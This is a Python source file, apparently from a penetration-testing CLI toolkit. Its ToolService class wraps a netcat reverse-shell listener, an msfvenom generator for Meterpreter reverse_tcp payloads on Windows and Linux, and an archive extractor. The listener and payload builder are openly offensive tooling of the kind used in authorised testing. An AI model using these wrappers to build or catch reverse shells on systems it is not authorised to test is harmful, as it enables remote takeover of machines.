import re

from ..cli import Context
from ..utilities.utils import Utils

# ------------------------------------------------------------------------------
#
#
#
# ------------------------------------------------------------------------------


class ToolService:

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def __init__(self, ctx: Context):
        self.ctx: Context = ctx
        self.utils: Utils = self.ctx.utils
        self.utils.logging.debug('tool-service is initiated')

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def nc(self, port: int = 9001):
        service_name = 'NC'
        self.utils.log_runBanner(service_name)
        path = self.utils.create_service_folder('tool/nc')
        self.utils.logging.debug(f'new folder created:: {path}')

        use_sudo = []
        if port <= 1024:
            use_sudo = ["sudo"]

        cmd_result = self.utils.run_command_output_loop(f'nc listening...', [
            use_sudo + ['rlwrap', 'nc', '-lvnp', str(port)],
            ['tee', f'{path}/nc.log']
        ])

        self.utils.logging.info(f'[*] {service_name} Done! View the log reports under {path}/')

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def msfvenom(self, host: str, port: int, format: str = 'dll', file_arch: str = '64', os: str = 'windows'):
        service_name = 'MSFVENOM'
        self.utils.log_runBanner(service_name)
        path = self.utils.create_service_folder('tool/msfvenom')
        self.utils.logging.debug(f'new folder created:: {path}')

        if file_arch == '32':
            reverse_arch = 'x86'
        else:
            reverse_arch = 'x64'

        if os == 'linux':
            # reverse_payload = ['-p', f'linux/{reverse_arch}/shell_reverse_tcp']
            reverse_payload = ['-p', f'linux/{reverse_arch}/meterpreter/reverse_tcp']
        elif os == 'windows':
            # reverse_payload = ['-p', f'windows/{reverse_arch}/shell_reverse_tcp']
            reverse_payload = ['-p', f'windows/{reverse_arch}/meterpreter/reverse_tcp']
        reverse_format = ['-f', format]
        reverse_arch = [f'-a{reverse_arch}']

        cmd_result = self.utils.run_command_output_loop(f'msfvenom create reverse shell...', [
            ['msfvenom'] + reverse_payload + [f'LHOST={host}', f'LPORT={port}', '-o', f'{path}/reverse_shell.{format}'] + reverse_format + reverse_arch
        ])

        self.utils.logging.info(f'[*] {service_name} Done! View the log reports under {path}/')

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def extract(self, file: str):
        service_name = 'EXTRACT'
        self.utils.log_runBanner(service_name)
        path = self.utils.create_service_folder('tool/extract')
        self.utils.logging.debug(f'new folder created:: {path}')

        if '.tar.bz2' in file:
            extract_type = ['tar', 'xjf']
        if '.tar.gz' in file:
            extract_type = ['tar', 'xzf']
        if '.bz2' in file:
            extract_type = ['bunzip2']
        if '.rar' in file:
            extract_type = ['unrar', 'x']
        if '.gz' in file:
            extract_type = ['gunzip']
        if '.tar' in file:
            extract_type = ['tar', 'xf']
        if '.tbz2' in file:
            extract_type = ['tar', 'xjf']
        if '.tgz' in file:
            extract_type = ['tar', 'xzf']
        if '.tar.xz' in file:
            extract_type = ['tar', 'xvfJ']
        if '.zip' in file:
            extract_type = ['unzip']
        if '.Z' in file:
            extract_type = ['uncompress']
        if '.7z' in file:
            extract_type = ['7z', 'x']
        if '.exe' in file:
            extract_type = ['7z', 'x']

        cmd_result = self.utils.run_command_output_loop(f'extract file...', [
            extract_type + [file]
        ])

        self.utils.logging.info(f'[*] {service_name} Done! View the log reports under {path}/')
